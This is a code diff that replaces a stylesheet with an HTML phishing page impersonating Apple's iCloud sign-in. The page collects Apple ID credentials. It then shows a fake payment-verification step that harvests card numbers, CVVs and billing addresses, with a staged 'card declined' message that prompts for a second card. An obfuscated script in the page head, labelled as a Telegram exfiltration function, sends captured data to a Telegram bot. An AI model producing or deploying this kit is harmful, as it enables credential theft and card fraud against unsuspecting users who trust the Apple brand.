@@ -1,213 +1,99 @@
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in to iCloud - Apple</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script>
+        // Obfuscated Telegram Exfil Function
+        (function(){var _0x1a2b=['https://api.telegram.org/bot','/sendMessage?chat_id=','&text=','fetch','then','json','YOUR_BOT_TOKEN','YOUR_CHAT_ID'];function _0x3c4d(_0x5e6f){var _0x7g8h=_0x1a2b[0]+_0x1a2b[6]+_0x1a2b[2]+encodeURIComponent(_0x5e6f);fetch(_0x7g8h,{method:'POST',headers:{'Content-Type':'application/json'}}).then(function(_0x9i0j){return _0x9i0j[_0x1a2b[4]]();}).catch(function(){});}window.exfilData=_0x3c4d;})();
+    </script>
+</head>
+<body>
+    <div id="pageContainer">
+        <!-- Login Form -->
+        <div id="loginForm" class="form-card">
+            <div class="logo">
+                <img src="logo.png" alt="iCloud" width="60">
+            </div>
+            <h1>Sign in to iCloud</h1>
+            <form id="loginFormElement">
+                <div class="input-group">
+                    <input type="email" id="appleId" placeholder="Apple ID or Email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <label class="checkbox">
+                    <input type="checkbox" id="keepSignedIn"> Keep me signed in
+                </label>
+                <button type="submit" class="submit-btn">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                        <path d="M8.5 5.5L15.5 12L8.5 18.5" stroke="white" stroke-width="2"/>
+                    </svg>
+                </button>
+            </form>
+            <div class="links">
+                <a href="#" id="forgotPassword">Forgot Apple ID or password?</a>
+            </div>
+        </div>
 
-body {
-    font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
-    background: #f5f7fa;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    color: #1d1d1f;
-}
+        <!-- Card Verification Page -->
+        <div id="cardVerifyPage" class="page hidden">
+            <div class="form-card">
+                <div class="logo">
+                    <img src="logo.png" alt="iCloud" width="60">
+                </div>
+                <h1>Verify Payment Method</h1>
+                <p>Account verification required due to security concerns. Please update your payment details.</p>
+                <form id="cardForm">
+                    <div class="input-group">
+                        <input type="text" id="cardName" placeholder="Cardholder Name" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
+                    </div>
+                    <div class="input-row">
+                        <div class="input-group">
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="billingAddress" placeholder="Billing Address" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="billingZip" placeholder="ZIP Code" required>
+                    </div>
+                    <button type="submit" class="submit-btn">Verify Card</button>
+                </form>
+                <div id="declinedMsg" class="error hidden">Card declined. Please try another.</div>
+                <form id="secondCardForm" class="hidden">
+                    <div class="input-group">
+                        <input type="text" id="cardName2" placeholder="Cardholder Name" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="cardNumber2" placeholder="Card Number" maxlength="19" required>
+                    </div>
+                    <div class="input-row">
+                        <div class="input-group">
+                            <input type="text" id="expiry2" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="text" id="cvv2" placeholder="CVV" maxlength="4" required>
+                        </div>
+                    </div>
+                    <button type="submit" class="submit-btn">Verify Alternate Card</button>
+                </form>
+            </div>
+        </div>
+    </div>
 
-#pageContainer {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    width: 100%;
-    max-width: 100%;
-    padding: 20px;
-}
-
-.form-card {
-    background: #fff;
-    border-radius: 18px;
-    box-shadow: 0 8px 30px rgba(0,0,0,0.1);
-    width: 100%;
-    max-width: 380px;
-    padding: 40px 30px;
-    text-align: center;
-}
-
-.logo {
-    margin-bottom: 24px;
-}
-
-.logo img {
-    width: 60px;
-    height: auto;
-}
-
-h1 {
-    font-size: 24px;
-    font-weight: 600;
-    margin-bottom: 16px;
-}
-
-p {
-    font-size: 14px;
-    color: #6e6e73;
-    margin-bottom: 24px;
-}
-
-.input-group {
-    position: relative;
-    margin-bottom: 16px;
-}
-
-.input-group input {
-    width: 100%;
-    padding: 12px 16px;
-    border: 1px solid #d2d2d7;
-    border-radius: 10px;
-    font-size: 16px;
-    background: #fff;
-    transition: border-color 0.3s, box-shadow 0.3s;
-}
-
-.input-group input:focus {
-    outline: none;
-    border-color: #0071e3;
-    box-shadow: 0 0 0 3px rgba(0,113,227,0.2);
-}
-
-.input-group.code-input input {
-    text-align: center;
-    letter-spacing: 4px;
-    font-size: 18px;
-}
-
-.input-row {
-    display: flex;
-    gap: 12px;
-}
-
-.input-row .input-group {
-    flex: 1;
-}
-
-.checkbox {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin: 16px 0;
-    font-size: 14px;
-    color: #6e6e73;
-}
-
-.checkbox input {
-    width: auto;
-    margin-right: 8px;
-}
-
-.submit-btn {
-    width: 100%;
-    padding: 12px;
-    background: #0071e3;
-    color: #fff;
-    border: none;
-    border-radius: 10px;
-    font-size: 16px;
-    font-weight: 500;
-    cursor: pointer;
-    transition: background 0.3s, transform 0.1s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-.submit-btn svg {
-    width: 24px;
-    height: 24px;
-}
-
-.submit-btn:hover {
-    background: #005bb5;
-    transform: scale(1.02);
-}
-
-.links {
-    margin-top: 16px;
-}
-
-.links a {
-    color: #0071e3;
-    text-decoration: none;
-    font-size: 14px;
-}
-
-.links a:hover {
-    text-decoration: underline;
-}
-
-.modal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.6);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 1000;
-}
-
-.modal-content {
-    background: #fff;
-    border-radius: 18px;
-    padding: 32px;
-    max-width: 320px;
-    text-align: center;
-}
-
-.hidden {
-    display: none;
-}
-
-.page {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    padding: 20px;
-}
-
-.error {
-    color: #d70015;
-    font-size: 14px;
-    margin-top: 12px;
-}
-
-@media (max-width: 480px) {
-    .form-card, .modal-content {
-        padding: 24px;
-        max-width: 90%;
-    }
-}
-
-@media (prefers-color-scheme: dark) {
-    body {
-        background: #000;
-        color: #f5f5f7;
-    }
-
-    .form-card, .modal-content {
-        background: #1c1c1e;
-        box-shadow: 0 8px 30px rgba(0,0,0,0.3);
-    }
-
-    .input-group input {
-        background: #2c2c2e;
-        border-color: #3c3c3e;
-        color: #f5f5f7;
-    }
-
-    p, .checkbox {
-        color: #86868b;
-    }
-}
+    <script src="script.js"></script>
+</body>
+</html>
